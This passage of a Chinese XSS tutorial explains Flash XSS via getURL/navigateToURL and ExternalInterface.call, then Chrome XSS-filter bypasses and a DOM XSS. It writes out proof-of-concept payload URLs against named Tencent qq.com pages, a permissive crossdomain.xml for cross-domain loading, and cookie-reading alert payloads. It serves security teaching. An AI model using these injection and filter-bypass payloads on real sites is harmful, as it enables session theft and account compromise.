+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt; //as3.0版本</div><div class="line">navigateToURL(new URLRequest(link), &quot;_self&quot;);</div><div class="line">//as2.0版本</div><div class="line">getURL(link,&quot;_self&quot;);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>其中link就是被打开的链接。</p>
+<p>如果link是 <code>&quot;javascript:alert(1)&quot;</code></p>
+<p>那么就可以执行JS代码了。这里的点击执行代码的效果类似于网页里的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;点我弹出1&lt;/a&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>基于以上基础知识，我们可以先来反编译一下腾讯的FLASH文件，看看是不是上面这样的。</p>
+<p>这里我用到的反编译软件是 actionscript viewer 2009。</p>
+<p>把下载好的FLASH文件，拖到软件里，然后把AS都保存出来，保存为文本文件。</p>
+<p><img src="14-2.webp" alt=""></p>
+<p>如上图，我们可以看到AS代码具有目录结构，这种是AS3的。如果不是这样目录的样子，则是AS2的代码。</p>
+<p>由于我们要定位的是使用到 link 的代码。 我们打开保存的as代码，进行搜索。</p>
+<p><img src="14-3.webp" alt=""></p>
+<p>可以看到，当点击图片时，直接将数据里的link作为参数传递到了 URLRequest中。</p>
+<p>既然如此，我们把<code>http://v.qq.com/doco/pic.xml</code> 给下载下来，</p>
+<p>将xml文件里的 <link> 部分修改一下。</p>
+<p><img src="14-4.webp" alt=""></p>
+<p>上传修改后的pic.xml到我们自己的服务器。</p>
+<p><img src="14-5.webp" alt=""></p>
+<p>这样一来， 腾讯的<code>http://imgcache.qq.com/liveportal_v1/swf/carousel.swf</code> 就会跨域加载我们的 <code>http://itsokla.duapp.com/pic.xml</code> 文件。</p>
+<p>既然是跨域加载，有必要说点基础知识。 FLASH跨域请求的流程大致如下：</p>
+<p><img src="14-6.webp" alt=""></p>
+<p>因而，我们要允许来自<code>imgcache.qq.com</code>的FLASH文件，访问我们的xml文件才行。</p>
+<p>在我们自己网站的根目录下，放置一个 <code>crossdomain.xml</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;?xml version=&quot;1.0&quot;?&gt;</div><div class="line">&lt;cross-domain-policy&gt;</div><div class="line">	&lt;allow-access-from domain=&quot;*.qq.com&quot; /&gt;</div><div class="line">&lt;/cross-domain-policy&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>点击图片时，触发。</p>
+<p><img src="14-7.webp" alt=""></p>
+</blockquote>
+<h2 id="15-Flash-Xss进阶-ExternalInterface-call第一个参数"><a href="#15-Flash-Xss进阶-ExternalInterface-call第一个参数" class="headerlink" title="15. Flash Xss进阶 [ExternalInterface.call第一个参数]"></a>15. Flash Xss进阶 [ExternalInterface.call第一个参数]</h2><blockquote>
+<p>除了上一节讲到的navigateToURL/getURL之外呢，另一个经常存在XSS缺陷的as函数就是ExternalInterface.call，此函数作为FLASH与宿主页面javascript通信的接口，一般来说，有“2”个参数，第一个参数为所调用js函数名，后续的其他参数则为所调用的js函数的参数。那么在参数可控的情况下，不论是第一个参数或是后续参数可控，我们均能加以利用实现XSS。本节先说一说第一个参数可控的情况。</p>
+<h3 id="先从程序员的角度说下基础知识"><a href="#先从程序员的角度说下基础知识" class="headerlink" title="先从程序员的角度说下基础知识"></a>先从程序员的角度说下基础知识</h3><p>有时候，我们需要在FLASH里调用当前页面中的javascript函数，例如：一个简单的需求，我们要在游戏加载完成后，执行弹出1的操作。</p>
+<p>javascript代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; alert(1)</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>as code:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; ExternalInterface.call(&quot;alert&quot;,&quot;1&quot;);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>有的程序员就会觉得，直接弹出1太丑了吧。于是他自己写个js的函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; function myalert(str)&#123;</div><div class="line">    //显示一个漂亮的浮动层，并且把str显示在上面。</div><div class="line">&#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>然后在as里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; ExternalInterface.call(&quot;myalert&quot;,&quot;1&quot;);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>又有一天，另外一个程序员觉得上面那个程序员写的东西不错，但是他的JS函数名不叫myalert，于是喊那个程序员改下as代码。于是那个程序员觉得，免得以后老是有人喊我改代码，他就将代码写成了下面这个样子。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; var func:String=root.loaderInfo.parameters.func; //接受FLASH所带的func参数</div><div class="line">ExternalInterface.call(func,&quot;1&quot;);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>这样一来，其他想用这个FLASH的人，不需要修改FLASH，只需要调用FLASH的时候带上参数即可。</p>
+<p>比如我的JS函数是newalert, 我只需要按照下面这么调用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://some.com/xxx.swf?func=newalert</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p> 上述过程提高了程序的可重用性，为开发人员带来了极大的便利，但是却是缺乏安全考虑的。</p>
+<p>攻击者可以采用以下的方式来执行自己的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://some.com/xxx.swf?func=(function()&#123;alert(&quot;hi jack&quot;)&#125;)</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>为了方便理解，我们可以将</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; ExternalInterface.call(&quot;函数名&quot;,&quot;参数1&quot;);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>看成JS里的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; 函数名(&quot;参数1&quot;);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>而FLASH里实际最后执行的JS代码，形式如下（至于下面这句哪里来的，暂时不表）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; try &#123; __flash__toXML(函数名(&quot;参数1&quot;)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>因而 函数名 部分也可以写为 <code>(function(){alert(&quot;hi jack&quot;)})</code> 的形式。</p>
+<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>漏洞点：</p>
+<p><a href="http://quan.qq.com/swf/swfupload.swf" target="_blank" rel="external">http://quan.qq.com/swf/swfupload.swf</a></p>
+<p> 怎么反编译，见上一篇。我们来看怎么查找缺陷。</p>
+<p>因为这是一个AS3.0的FLASH文件，我们首先确定FLASH是否有接受参数。</p>
+<p>as3.0 接受参数的方法，所有参数存放在 <code>root.loaderInfo.parameters</code> 对象里。</p>
+<p>例如 <code>aaa.swf?a=1&amp;b=2&amp;c=3</code>, 那么 <code>root.loaderInfo.parameters</code> 则等于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt; &#123;</div><div class="line">	&quot;a&quot;:1,</div><div class="line">	&quot;b&quot;:2,</div><div class="line">	&quot;c&quot;:3</div><div class="line">&#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>我们可以定位到 movieName变量</p>
+<p><img src="15-0.webp" alt=""></p>
+<p>可以看出，FLASH的movieName参数，存放到了this.movieName中。</p>
+<p>进一步， this.movieName被带入了到了<code>this.flashReady_Callback</code>及其它变量。</p>
+<p><img src="15-1.webp" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; this.flashReady_Callback = ((&quot;SWFUpload.instances[\&quot;&quot; + this.movieName) + &quot;\&quot;].flashReady&quot;);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>我们再进一步看看，this.flashReady_Callback 被用到了哪里。</p>
+<p><img src="15-2.webp" alt=""></p>
+<p>再接着看看调用 <code>this.flashReady_Callback</code> 的Simple函数是啥样子的。</p>
+<p><img src="15-3.webp" alt=""></p>
+<p>可以看到，最终这个参数被放到 ExternalInterface.call 的第一个参数中执行了。</p>
+<p>是不是很激动。我们来假设一下，按下面调用FLASH</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://quan.qq.com/swf/swfupload.swf?movieName=aaaaaaaa</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>那么this.flashReady_Callback就等于以下内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; SWFUpload.instances[&quot;aaaaaaaa&quot;].flashReady</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>最终调用的是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; ExternalInterface.call(&apos;SWFUpload.instances[&quot;aaaaaaaa&quot;].flashReady&apos;);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>如果我们要调用自己的JS代码，就需要构造闭合，但是你会发现有一定问题。。</p>
+<p>我们最多能够造成下面的模样。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; ExternalInterface.call(&apos;SWFUpload.instances[&quot;aaa&quot;];function SWFUpload()&#123;&#125;;SWFUpload[&quot;aaa&quot;].flashReady&apos;);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>但是这样是无法正确执行的，因为 SWFUpload.instances没有被定义，从而SWFUpload.instances[“aaa”]会失败。</p>
+<p>怎么办呢？这里就要拿出我们第5步里的知识了。我们把“函数名”换成call的第一个参数内容。变成下面的形式。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; try &#123; __flash__toXML(SWFUpload.instances[&quot;aaaaaaaa&quot;].flashReady(&quot;参数1&quot;)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>我们再基于以上代码来构造，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; try &#123; __flash__toXML(SWFUpload.instances[&quot;aaa&quot;])&#125;catch(e)&#123;alert(1)&#125;;//&quot;].flashReady(&quot;参数1&quot;)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>图片解析:</p>
+<p><img src="15-4.webp" alt=""></p>
+<p>上面一行不好看懂的话，写的好看点。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt; try &#123;</div><div class="line">	__flash__toXML(SWFUpload.instances[&quot;aaa&quot;])   //此行代码，因为SWFUpload未定义，出错，跳转到catch部分</div><div class="line">&#125;catch(e)&#123;</div><div class="line">	alert(1); //这里将会被执行。</div><div class="line">&#125;;</div><div class="line">//&quot;].flashReady(&quot;参数1&quot;)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p> 最后，我们把构造的代码，放进FLASH的参数里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://quan.qq.com/swf/swfupload.swf?movieName=aaa&quot;])&#125;catch(e)&#123;alert(1)&#125;;//</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>可以看到成功执行alert(1)</p>
+<p><img src="15-5.webp" alt=""></p>
+</blockquote>
+<h2 id="16-Flash-Xss进阶-ExternalInterface-call第二个参数"><a href="#16-Flash-Xss进阶-ExternalInterface-call第二个参数" class="headerlink" title="16. Flash Xss进阶 [ExternalInterface.call第二个参数]"></a>16. Flash Xss进阶 [ExternalInterface.call第二个参数]</h2><blockquote>
+<p>讲完<code>ExternalInterface.call</code>的第一个参数，我们接着来讲第“2”个参数，之所以2打上引号，因为 call 函数的原型是：<code>call(functionName:String, ... arguments):*</code>， 即后面可以有很多很多个参数，我们统称为第2个参数。有时候我们会遇到<code>ExternalInterface.call(&quot;xxxxx&quot;,&quot;可控内容&quot;);</code>的情况，那么这种情况下，如何构造XSS呢？</p>
+<p>通过GOOGLE搜索，<code>site:qq.com filetype:swf inurl:xml</code></p>
+<p>我们可以找到以下FLASH。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://imgcache.qq.com/qzone_v4/2/default_menu_horizontal.swf?xml_path=http://imgcache.qq.com/qzone/client/custom_menu/custom_menu.xml</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>借鉴上上节教程的思路，我们可以看看<code>http://imgcache.qq.com/qzone/client/custom_menu/custom_menu.xml</code>里是个什么内容。</p>
+<p><img src="16-0.webp" alt=""></p>
+<p>好像看不出来是个啥用途，我们反编译FLASH文件。</p>
+<p><img src="16-1.webp" alt=""></p>
+<p>接着我们先看看是否有getURL, ExternalInterface.call之类的。</p>
+<p><img src="16-2.webp" alt=""></p>
+<p>可以看到，我们搜索到的是下面这句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; flash.external.ExternalInterface.call(&quot;custom_menu_swf&quot;, menu_array[_local2].href);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>那么call的第一个参数是被限定死了～，第2个参数为 menu_array[_local2].href，</p>
+<p>如果你对AS有一点了解，不难看出menu_array是一个数组，那么_local2应该就是数组的下标，</p>
+<p>而从单词含义“菜单数组”我们不难联想到上面xml文件里的数据。</p>
+<p><img src="16-3.webp" alt=""></p>
+<p>换句话说，这里我们的可以控制call的第2个参数。同教程14中的方法，我们下载下来<code>http://imgcache.qq.com/qzone/client/custom_menu/custom_menu.xml</code>。 先做点修改，然后上传到自己网站上。我们将代码里日志那一行的href改掉。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;menu name=&quot;日  志&quot; href=&quot;\&amp;quot;,alert(1)&quot; /&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>上传修改后的文件，同时记得将crossdomain.xml上传至自己的网站根目录下哦～～（见教程14）</p>
+<p>接着我们载入我们自己指定的XML文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://imgcache.qq.com/qzone_v4/2/default_menu_horizontal.swf?xml_path=http://itsokla.duapp.com/custom_menu.xml</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>接着我们打开Firefox浏览器。 有人会问，你怎么突然要用Firefox啊！疯了么！！ 同志们，我没疯，只是因为FF可以捕获到这里的错误，而chrome捕获不到！</p>
+<p>我们打开Firefox后， 访问上面的地址，点击【日志】按钮！！</p>
+<p>Ctrl+shift+J 打开错误控制台！可以看到以下报错！</p>
+<p><img src="16-4.webp" alt=""></p>
+<p>记性好的朋友，会马上想起上一节里我们说到的。</p>
+<p>ExternalInterface.call(“函数名”,”参数1”);</p>
+<p>实际上执行的是以下内容，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; try &#123; __flash__toXML(函数名(&quot;参数1&quot;)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>我们就是从FF这里捕获错误到这点的！（:) 当然也还会有其他方法）。</p>
+<p>为什么会出错 </p>
+<p>当我们点击 【日志】按钮时，会调用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; flash.external.ExternalInterface.call(&quot;custom_menu_swf&quot;, menu_array[_local2].href);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>而<code>menu_array[_local2].href</code> 等于 <code>\&quot;,alert(1)</code>, 进而，我们代入完整的代码，即如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; try &#123; __flash__toXML(custom_menu_swf(&quot;\\&quot;,alert(1)&quot;)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>转换过程如下图：</p>
+<p><img src="16-5.webp" alt=""></p>
+<p>可以看到转换之后，JS代码有点乱，引号到处飞，括号无处寻，因而报错了！</p>
+<p>那么我们怎么构造正确的利用代码呢？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; try &#123; __flash__toXML(custom_menu_swf(&quot;构造点构造点&quot;)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>首先第一步，要注入自己代码，首先要闭合掉双引号！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; try &#123; __flash__toXML(custom_menu_swf(&quot;构造点&quot;),alert(&quot;构造点&quot;)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>但是从上面转换流程，我们可以看到， <code>&quot;</code> 会变成 <code>\&quot;</code>, 即变成了下面的样子，还是突破不出去。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; try &#123; __flash__toXML(custom_menu_swf(&quot;构造点\&quot;),alert(\&quot;构造点&quot;)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p><img src="16-6.webp" alt=""></p>
+<p>不过非常庆幸的事情是，这里没有对 <code>\</code> 进行转义。 我们可以通过输入 <code>\&quot;</code> 来构造。JS的字符串里，<code>\</code> 用 <code>\\</code> 表示。如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; try &#123; __flash__toXML(custom_menu_swf(&quot;构造点\\&quot;))&#125;catch(e)&#123;alert(1)&#125;//构造点&quot;)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p><img src="16-7.webp" alt=""></p>
+<p>罗嗦了这么多，我们把构造点代码，拿出来，插入到XML文件里。注意以下几点：</p>
+<ul>
+<li>最后构造的代码是\“, 实际我们的输入是\”，然后由FLASH自己转变为\“的，因而利用代码里只需要输入\”即可。</li>
+<li>由于在XML的节点属性里，双引号写为 <code>&amp;quot;</code>, <code>&lt;menu name=&quot;日 志&quot; href=&quot;构造点\&amp;quot;))}catch(e){alert(1)}//构造点&quot; /&gt;</code></li>
+</ul>
+<p>再次上传文件。打开</p>
+<p><code>http://imgcache.qq.com/qzone_v4/2/default_menu_horizontal.swf?xml_path=http://itsokla.duapp.com/custom_menu.xml</code></p>
+<p>点击日志，看看效果。</p>
+<p><img src="16-8.webp" alt=""></p>
+</blockquote>
+<h1 id="XSS-Filter-Bypass"><a href="#XSS-Filter-Bypass" class="headerlink" title="XSS Filter Bypass"></a>XSS Filter Bypass</h1><h2 id="17-XSS过滤器绕过-通用绕过"><a href="#17-XSS过滤器绕过-通用绕过" class="headerlink" title="17. XSS过滤器绕过 [通用绕过]"></a>17. XSS过滤器绕过 [通用绕过]</h2><blockquote>
+<p>关于反射型的基本东西，暂时就到这啦，如果后面有什么好的case，再做增补。最近，有些人会问到怎么绕过浏览器的XSS过滤器，所以从这节开始，给出点绕过的例子。</p>
+<p>当然这些绕过浏览器的方法，不是万能的。不同浏览器，不同场景都会存在差异。满足场景要求时，才可以使用。</p>
+<p>IE的一些绕过见乌云上的 @gainover，@sogili 的例子，我们教程就不再提及了。</p>
+<p>此文给出的是一个来自sogili分享的chrome下绕过过滤器的方法，在腾讯某处XSS上的应用。</p>
+<p>这一类都算是“结合了一定场景”，绕过了浏览器自身的防御机制，具有一定的通用性，我们称为“通用绕过”（瞎起的名字，别在意）。</p>
+<p>但是在后续版本的浏览器中，这些技巧可能会被浏览器干掉从而失效。再次强调：通用不是全部都行，意思是所适用的场景实际发生的概率比较高！</p>
+<p>漏洞点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://bangbang.qq.com/php/login?game=roco&amp;uin=&quot;&gt;&lt;img src=1 onerror=alert(1)&gt;&amp;world=5&amp;roleid=44583443&amp;level=8&amp;role=%2</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>uin参数没有对任何字符进行过滤。</p>
+<p>正是由于这个点什么都没过滤，浏览器自身的防御机制也最好发挥作用，瞧瞧，chrome拦截了。。</p>
+<p><img src="17-0.webp" alt=""></p>
+<p>有的新手，不知道有过滤器的，更是会觉得 “啊，这是怎么回事，怎么不行啊，明明可以的。。”</p>
+<p>我们只要看到console里有上面那句，就说明 chrome的过滤器大发神威了！！</p>
+<p>看看源码</p>
+<p><img src="17-1.webp" alt=""></p>
+<p>危害部分被和谐了。</p>
+<p>那么怎么绕过呢？ 这里直接说方法。</p>
+<p>首先要求缺陷点，允许 <code>&lt;</code> , <code>&gt;</code> 。其次，要求缺陷点的后方存在 <code>&lt;/script&gt;</code> 标签。 我们看看当前的这个点的代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt; ...</div><div class="line">&lt;input type=&quot;hidden&quot; id=&quot;sClientUin&quot; value=&quot;&quot;&gt;&lt;img src=1 onerror=alert(1)&gt;&quot;&gt;</div><div class="line">...</div><div class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://pingjs.qq.com/tcss.ping.js&quot;&gt;&lt;/script&gt;</div><div class="line">...</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>可以看到上面的要求均满足。我们就可以使用以下技巧。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;script src=data:,alert(1)&lt;!--</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>代入到我们的利用代码里。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://bangbang.qq.com/php/login?game=roco&amp;uin=&quot;&gt;&lt;script src=data:,alert(1)&lt;!--&amp;world=5&amp;roleid=44583443&amp;level=8&amp;role=%2</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>这次，我们就成功啦。</p>
+<p><img src="17-2.webp" alt=""></p>
+</blockquote>
+<h2 id="18-XSS过滤器绕过-猥琐绕过"><a href="#18-XSS过滤器绕过-猥琐绕过" class="headerlink" title="18. XSS过滤器绕过 [猥琐绕过]"></a>18. XSS过滤器绕过 [猥琐绕过]</h2><blockquote>
+<p>有些时候，通用的绕过技巧并不可行，这个时候我们就得观察缺陷点的周围环境，想想其它办法咯。“猥琐绕过”与通用绕过不同的是，它通用性小，往往只是特例。</p>
+<p>漏洞点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://qzs.qq.com/qzone/v6/custom/custom_module_proxy.html#siDomain=1&amp;g_StyleID=aaaaaaaaaa</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>一个DOM XSS</p>
+<p><img src="18-0.webp" alt=""></p>
+<p>看看源码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&gt; ....</div><div class="line">var siDomain = paras[&apos;siDomain&apos;],</div><div class="line">	g_StyleID = paras[&apos;g_StyleID&apos;].replace(&quot;v6/&quot;,&quot;&quot;);</div><div class="line">	if(siDomain.indexOf(&quot;.qq.com&quot;)&gt;-1)&#123;//防止qzs.qq.com</div><div class="line">		siDomain = paras[&apos;siDomain&apos;] = &quot;qzonestyle.gtimg.cn&quot;;</div><div class="line">	&#125;</div><div class="line">	document.write(&apos;&lt;link href=&quot;http://&apos;+siDomain+&apos;/qzone_v6/gb/skin/&apos;+g_StyleID+&apos;.css&quot; rel=&quot;stylesheet&quot; /&gt;&lt;link href=&quot;http://&apos;+siDomain+&apos;/qzone_v6/home_normal.css&quot; rel=&quot;stylesheet&quot; /&gt;&apos;);</div><div class="line">...</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p><code>siDomain</code>与<code>g_StyleID</code>都是地址栏里获取过来，然后通过document.write输出到页面中。</p>
+<p>利用先前教程的知识，我们不难构造出利用代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://qzs.qq.com/qzone/v6/custom/custom_module_proxy.html#siDomain=1&amp;g_StyleID=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>IE下成功弹出</p>
+<p><img src="18-1.webp" alt=""></p>
+<p>但是到了chrome下，又被拦截了。。</p>
+<p><img src="18-2.webp" alt=""></p>
+<p>并且，因为这里接受地址栏的参数时，是以 “=” 分割，因而我们的代码中是不允许携带 等号的。故上一篇的技巧不能拿到这里来使用了！</p>
+<p>chrome拦截，是有一定的拦截规则的，只有它觉得是恶意代码的才会去拦截。这个时候，就需要我们“观察地形”啦！！</p>
+<p>我们仔细看看这句。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; g_StyleID = paras[&apos;g_StyleID&apos;].replace(&quot;v6/&quot;,&quot;&quot;);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>这里会对g_StyleID进行一次替换，将<code>v6/</code>替换为空。那么如果我们的<code>g_StyleID</code>写为下面的情况</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;scrv6/ipt&gt;alert(document.cookie)&lt;/script&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>替换后<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>能够正常执行，但是Chrome又不会觉得它是恶意代码了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://qzs.qq.com/qzone/v6/custom/custom_module_proxy.html#siDomain=1&amp;g_StyleID=&quot;&gt;&lt;scv6/ript&gt;alert(document.cookie)&lt;/script&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>成功绕过</p>
+<p><img src="18-3.webp" alt=""></p>
+</blockquote>
+<h1 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h1><p>一般来说，存储型XSS也是危害最大的XSS</p>
